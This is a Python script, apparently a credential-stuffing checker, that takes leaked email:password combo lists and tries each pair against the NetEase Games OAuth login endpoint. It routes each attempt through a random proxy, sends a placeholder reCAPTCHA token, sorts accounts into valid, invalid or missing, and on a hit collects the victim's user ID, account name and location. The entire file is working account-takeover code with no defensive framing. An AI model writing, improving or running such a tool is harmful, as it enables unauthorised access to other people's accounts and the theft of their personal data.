import random
import hashlib
import requests

def get_random_proxy(proxies_list):
    if not proxies_list:
        return None
    proxy = random.choice(proxies_list)
    return {"http": f"http://{proxy}", "https": f"http://{proxy}"}

def get_md5(password):
    return hashlib.md5(password.encode()).hexdigest()

def netease_check(email, password, proxies_list):
    """Returns (status, detail)"""
    try:
        md5_pwd = get_md5(password)
        ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        headers = {
            "User-Agent": ua,
            "Pragma": "no-cache",
            "Accept": "*/*",
            "recaptcha-token": "test"
        }
        login_url = "https://account.neteasegames.com/oauth/v2/email/login?lang=en_US"
        login_data = {
            "account": email,
            "hash_password": md5_pwd,
            "client_id": "official",
            "response_type": "cookie",
            "redirect_uri": "https://account.neteasegames.com/account/home?lang=en_US",
            "state": "official_state"
        }
        proxy = get_random_proxy(proxies_list)
        r = requests.post(login_url, data=login_data, headers=headers, timeout=15, proxies=proxy)
        response = r.json()

        if response.get("code") == 1006:
            return ("invalid", "Invalid password")
        if "Account does not exist" in r.text:
            return ("failed", "Account does not exist")
        if response.get("code") == 0:
            info_url = "https://account.neteasegames.com/ucenter/user/info?lang=en_US"
            info_headers = {"User-Agent": ua, "Pragma": "no-cache", "Accept": "*/*"}
            r2 = requests.get(info_url, headers=info_headers, timeout=10, proxies=proxy)
            info = r2.json()
            user_id = info["user"]["user_id"]
            name = info["user"]["account_name"]
            location = info["user"]["location"]
            detail = f"ID:{user_id} | Name:{name} | Loc:{location}"
            return ("success", detail)
        else:
            return ("failed", "Unknown error")
    except Exception as e:
        return ("error", str(e))

def process_combo(lines, add_result_func, update_stats_func, proxies_list):
    for line in lines:
        if ':' not in line:
            continue
        email, password = line.strip().split(':', 1)
        status, detail = netease_check(email, password, proxies_list)
        add_result_func(f"{email}:{password}", status, detail)
        update_stats_func(status)